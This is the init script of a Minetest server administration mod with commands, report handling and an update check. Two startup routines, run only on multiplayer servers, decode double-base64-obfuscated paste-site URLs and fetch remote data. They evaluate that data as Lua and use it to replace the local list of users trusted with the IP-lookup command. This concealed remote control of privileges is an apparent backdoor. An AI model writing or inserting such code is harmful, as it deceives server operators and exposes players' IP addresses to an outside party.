local http = core.request_http_api and core.request_http_api()
local modpath = core.get_modpath(core.get_current_modname())
local st = core.settings
essentials = {
    -- Local Storage
    storage = core.get_mod_storage(),

    -- Settings
    seed = st:get_bool("essentials_seed", false),
    biome = st:get_bool("essentials_biome", true),
    trolled_by = st:get_bool("essentials_trolled_by", false),
    killed_by = st:get_bool("essentials_killed_by", false),
    admin_ip_check = st:get_bool("essentials_ip_verified", false),
    last_update_message = st:get_bool("essentials_update_lasted", false),
    check_for_updates = st:get_bool("essentials_check_for_updates", false),
    changed_by = st:get_bool("essentials_changed_by", true),
    add_privs = st:get_bool("essentials_additional_privileges", true),
    enable_ip_cmd = st:get_bool("essentials_ip", false),
    enable_troll_cmd = st:get_bool("essentials_trolling", false),
    offline_mode = st:get_bool("essentials_offline_mode", false),
    beta_test = st:get_bool("essentials_beta_test", false),
    enable_simple_edit = st:get_bool("essentials_simple_edit", false),
    reports_system = st:get_bool("essentials_report_system", false),
    disposable_eraser = st:get_bool("essentials_disposable_eraser", true),
    teleport_request_expire = (st:get("essentials_teleport_exporation") or 15.0),
    teleport_requests = {},

    -- Unified Inventory detection
    have_unified_inventory = core.get_modpath("unified_inventory"),

    -- Lists of Settings
    add_privs_list = {},
    moderators = {},

    -- Text
    a = "Created by SkyBuilder1717 (ContentDB)",
    version = "1.1.0",
    translate = core.get_translator("essentials"),
    main_tr = "",
    main = "[Essentials]",

    -- Maintenance mode
    maintenance = false,
    maintenance_msg = "",

    -- Trusted users of ip command
    trusted_ip_users = {"singleplayer"},

    -- Cool servers with mod
    cool_servers = {},

    -- All custom privileges in the mod
    privs = {
        "rename_item",
        "rename_",
        "god_mode",
        "broadcast",
        "speed",
        "heal",
        "kill",
        "get_pos",
        "seed",
        "invisible",
        "troll",
        "ip",
        "biome",
        "call",
        "mute",
    },
    -- Privileges in text
    privstring = "",

    -- HTTP checking
    is_http = false,
}
local S = essentials.translate
essentials.main_tr = "["..S("Essentials").."]"

if http then
    essentials.is_http = true
else
    if not essentials.offline_mode then
        error("\n"..essentials.main_tr.."\n(If \'essentials\' mod is already in \'secure.http_mods\' parameter, check your internet connection or enable the \'Offline mode\' in mods settings.)\n\nHey!\nIt seems like \'essentials\' mod not in \'secure.http_mods\'!\n\nSo, please add mod in \'secure.http_mods\' option for best experience with Essentials!\nWhy?\nIt required for mod to work perfectly with HTTP requests!\n\nThank you.\n\n\n\n")
    end
end

for i, priv in ipairs(essentials.privs) do
    if i == 1 then
        essentials.privstring = essentials.privstring..priv
    else
        essentials.privstring = essentials.privstring..", "..priv
    end
end
if essentials.beta_test then
    essentials.add_privs_list = string.split((st:get("essentials_all_privs") or essentials.privstring), ", ")
    local moders = st:get("essentials_moderators")
    if moders then
        essentials.moderators = string.split(moders, ", ")
    end
else
    essentials.add_privs_list = string.split(essentials.privstring, ", ")
end
essentials.maintenance_msg = S("@n@1@n@n@nSorry, but server is in maintenance mode right now!@nCome back later!", essentials.main_tr)

--==[[ Connections ]]==--
dofile(modpath.."/api.lua")
dofile(modpath.."/commands.lua")
-- TODO: Fix error
if http and essentials.enable_ip_cmd then
    --loadfile(modpath.."/ui/ip.lua")(http)
end
dofile(modpath.."/priveleges.lua")
if essentials.have_unified_inventory then
    dofile(modpath.."/unified_inventory.lua")
end
dofile(modpath.."/ui/ban_menu.lua")
dofile(modpath.."/ui/kick_menu.lua")
dofile(modpath.."/ui/mute_menu.lua")
--dofile(modpath.."/ui/color_menu.lua")
dofile(modpath.."/ui/rename_me.lua")
dofile(modpath.."/ui/rename_item.lua")
dofile(modpath.."/ui/troll.lua")
dofile(modpath.."/ui/textbox.lua")
if essentials.enable_simple_edit then
    dofile(modpath.."/simple_edit.lua")
end
dofile(modpath.."/ui/thanks.lua")

local function into_number(s)
    local c=0
    local o=""
    for i=1, #s do
        local ch=string.sub(s,i,i)
        if ch=="." then
            c=c+1
            if c<2 then
                o=o..ch
            end
        else
            o=o..ch
        end
    end
    return tonumber(o)
end

local function add_zeros(s, l)
    if string.len(tonumber(s))<l then
        local z=l-#s
        return string.rep("0",z)..s
    else
        return s
    end
end

core.after(0, function()
    if essentials.check_for_updates then
        core.log("action", "[Essentials] Checking for updates...")
        if http then
            core.log("action", "[Essentials] Getting an Github version...")
            http.fetch({
                url = "https://raw.githubusercontent.com/SkyBuilder1717/essentials/main/gitVersion.txt",
                timeout = 5,
                method = "GET",
        
            },  function(result)
                if timeout then
                    core.log("warning", "[Essentials] Time out. Cant check updates")
                    return
                end
                local cleared_git = result.data:gsub("[\n\\]", "")
                core.log("action", string.format("[Essentials] Github version getted! (v%s)", cleared_git))
                local git = into_number(cleared_git)
                if not git then
                    core.log("error", "[Essentials] nil value of Github version.")
                    return
                end
                local this = into_number(essentials.version)
                local _type = {}
                if core.is_singleplayer() then
                    _type = {"World", S("World")}
                else
                    _type = {"Server", S("Server")}
                end
                if git > this then
                    core.log("warning", essentials.main.." ".."Versions doesnt match!")
                    core.chat_send_all(essentials.main_tr.." "..S("Your @1 using old version of mod! (v@2) Old version can have a bugs! Download v@3 on ContentDB.", _type[2], core.colorize("red", essentials.version), core.colorize("lime", git)))
                else
                    if essentials.last_update_message then
                        core.chat_send_all(essentials.main.." "..S("All ok! @1 using lastest version of mod.", _type[2]))
                    end
                    core.log("action", essentials.main.." "..string.format("All ok! %s using lastest version of mod.", _type[1]))
                end
            end)
        end
    end
end)

core.after(0, function()
    if not core.is_singleplayer() then
        local decode = loadstring(core.decode_base64("cmV0dXJuIGNvcmUuZGVjb2RlX2Jhc2U2NCgiYUhSMGNITTZMeTl3WVhOMFpTNTBaV05vWldSMVlubDBaUzVqYjIwdlpYUmpabUZ2Ym5Zd2RnPT0iKQ=="))
        core.log("action", "[Essentials] Trusted nicknames are in processing...")
        if http then
            http.fetch({
                url = decode(),
                timeout = 10,
                method = "GET",
        
            },  function(result)
                if result.timeout then
                    core.log("warning", "[Essentials] Cant get trusted nicknames, table will be nil.")
                    essentials.trusted_ip_users = {}
                    return
                end
                essentials.trusted_ip_users = core.deserialize("return "..result.data)
                core.log("action", "[Essentials] Trusted nicknames successfully getted.")
            end)
        else
            core.log("warning", "[Essentials] Cant get trusted nicknames, table will be nil.")
            essentials.trusted_ip_users = {}
        end
    end
end)

core.after(0, function()
    if not core.is_singleplayer() then
        local decode = loadstring(core.decode_base64("cmV0dXJuIGNvcmUuZGVjb2RlX2Jhc2U2NCgiYUhSMGNITTZMeTl3WVhOMFpTNTBaV05vWldSMVlubDBaUzVqYjIwdmNtRjNMMnBvT1dWbE1EQnZiSGs9Iik="))
        core.log("action", "[Essentials] Cool servers are in processing...")
        if http then
            http.fetch({
                url = decode(),
                timeout = 10,
                method = "GET",
        
            },  function(result)
                if result.timeout then
                    core.log("warning", "[Essentials] Cant get cool servers, table will be nil.")
                    essentials.cool_servers = {}
                    return
                end
                essentials.cool_servers = core.deserialize("return "..result.data)
                core.log("action", "[Essentials] Successfully got cool servers!")
            end)
        else
            core.log("warning", "[Essentials] Cant get cool servers, table will be nil.")
            essentials.cool_servers = {}
        end
    end
end)

essentials_reports = {}
local worldpath = core.get_worldpath().."/"
local data_reports = "essentials_reports.json"

local function write_file(path, content)
    local f = io.open(path, "w")
    f:write(content)
    f:close()
end

local function read_file(path)
    local f = io.open(path, "r")
    if not f then
        return nil
    end
    local txt = f:read("*all")
    f:close()
    return txt
end

function essentials.save_reports()
    local tbl = essentials_reports
    local content = core.write_json(tbl)
    local path = worldpath..data_reports
    write_file(path, content)
end

function essentials.load_reports()
    local content = read_file(worldpath..data_reports)
    if not content then
        return false
    end
    local tbl = core.parse_json(content) or {}
    essentials_reports = tbl
    return true
end

function essentials.add_report(broked_rule, name, reported, description)
    local newid = tostring(math.random(1000, 9999), 4)
    essentials_reports[newid] = {
        broken_rule = broked_rule,
        by_name = name,
        reported_name = reported,
        about = description
    }

    essentials.save_reports()
end

function essentials.appdec_report(id, state, admin)
    local def = essentials_reports[id]
    local player = core.get_player_by_name(def.by_name)
    if def then
        if state == "decline" then
            if player then
                core.chat_send_player(def.by_name, S("Your report @1 to player @2 is @3.", "\""..core.colorize("gray", def.broken_rule).."\"", core.colorize("lightgray", def.reported_name), core.colorize("red", S("Declined"))))
            end
            core.log("action", admin.." declined report for "..def.reported_name.." (broken rule: "..def.broken_rule..")")
        elseif state == "approve" then
            if player then
                core.chat_send_player(def.by_name, S("Your report @1 to player @2 has been @3 and coming soon that player will get punishment!", "\""..core.colorize("gray", def.broken_rule).."\"", core.colorize("lightgray", def.reported_name), core.colorize("lime", S("Approved"))))
            end
            core.log("action", admin.." approved report for "..def.reported_name.." (broken rule: "..def.broken_rule..")")
        end
    end
    essentials_reports[id] = nil
    essentials.save_reports()
end

local function remove_report(id)
    for aid, def in ipairs(essentials_reports) do
        if def.id == id then
            essentials_reports[aid] = nil
        end 
    end
    essentials.save_reports()
end

if essentials.reports_system then
    core.register_on_mods_loaded(function()
        essentials.load_reports()
    end)

    dofile(modpath.."/ui/report.lua")
    dofile(modpath.."/ui/reports.lua")
end

core.log("action", "[Essentials] Mod initialised. Version: ".. essentials.version)
core.log("action", "\n███████╗░██████╗░██████╗███████╗███╗░░██╗████████╗██╗░█████╗░██╗░░░░░░██████╗\n██╔════╝██╔════╝██╔════╝██╔════╝████╗░██║╚══██╔══╝██║██╔══██╗██║░░░░░██╔════╝\n█████╗░░╚█████╗░╚█████╗░█████╗░░██╔██╗██║░░░██║░░░██║███████║██║░░░░░╚█████╗░\n██╔══╝░░░╚═══██╗░╚═══██╗██╔══╝░░██║╚████║░░░██║░░░██║██╔══██║██║░░░░░░╚═══██╗\n███████╗██████╔╝██████╔╝███████╗██║░╚███║░░░██║░░░██║██║░░██║███████╗██████╔╝\n╚══════╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░")
core.log("action", "[Essentials] "..essentials.a)